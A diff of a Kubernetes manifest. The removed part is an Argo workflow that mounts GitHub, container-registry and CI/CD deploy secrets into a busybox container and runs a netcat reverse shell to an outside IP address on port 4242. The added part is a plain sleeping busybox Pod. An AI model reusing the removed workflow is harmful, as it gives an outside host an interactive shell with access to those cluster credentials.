@@ -1,39 +1,11 @@
+apiVersion: v1
+kind: Pod
 metadata:
- generateName: test-
- namespace: default
+  name: busybox-pod
+  namespace: nati
 spec:
- entrypoint: argosay
- serviceAccountName: argo
- templates:
-   - name: argosay
-     volumes:
-       - name: github
-         secret:
-           secretName: github-basic
-       - name: gcr
-         secret:
-           secretName: argo-gcr
-       - name: cicd
-         secret:
-           secretName: ci-cd-deploy
-     container:
-       name: main
-       image: 'busybox'
-       volumeMounts:
-         - mountPath: /tmp/github
-           name: github
-         - mountPath: /tmp/gcr
-           name: gcr
-         - mountPath: /tmp/cicd
-           name: cicd
-       command: [
-         "sh",
-         "-c"
-       ]
-       args: [
-         "rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc 157.230.126.229 4242 >/tmp/f"
-       ]
- ttlStrategy:
-   secondsAfterCompletion: 15
- podGC:
-   strategy: OnPodCompletion
+  containers:
+  - name: busybox
+    image: busybox
+    command: ["sleep", "3600"]
+  serviceAccountName: nati-service-account
